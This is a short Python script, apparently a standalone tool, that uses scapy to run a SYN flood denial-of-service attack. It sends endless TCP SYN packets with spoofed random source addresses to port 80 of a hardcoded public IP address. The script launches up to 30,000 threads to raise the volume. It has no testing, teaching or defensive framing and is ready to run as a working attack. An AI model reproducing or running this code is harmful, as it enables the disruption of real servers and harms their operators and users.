```python
# -*- coding:utf-8 -*-
# author:HPCM
# datetime:2020/6/28 8:39
import time
import random
import threading

from scapy.all import send
from scapy.layers.inet import IP, TCP


class SYNFlood(object):
    """syn泛洪攻击"""

    def __init__(self, attack_ip, sync_num=None):
        self.attack_ip = attack_ip
        self.sync_num = sync_num

    def attack(self):
        while True:
            for port in range(1024, 65535):
                try:
                    ip_layer = IP(src=self.gen_random_ip(), dst=self.attack_ip)
                    tcp_layer = TCP(sport=random.randint(1024, 65535), dport=80, flags="S")
                    pkt = ip_layer / tcp_layer
                    send(pkt)
                    print(".", sep="", end="")
                except:
                    pass

    def gen_random_ip(self):
        """生成随机ip"""
        return "{}.{}.{}.{}".format(
            random.randint(0, 255),
            random.randint(0, 255),
            random.randint(0, 255),
            random.randint(0, 255),
        )

    def async_attack(self):
        """并发执行"""
        while True:
            print(1)
            if threading.activeCount() < self.sync_num:
                t = threading.Thread(target=self.attack)
                t.start()
            else:
                time.sleep(3)


if __name__ == '__main__':
    # "120.199.71.16", 30000
    sf = SYNFlood("120.199.71.16", 30000)
    sf.async_attack()
```

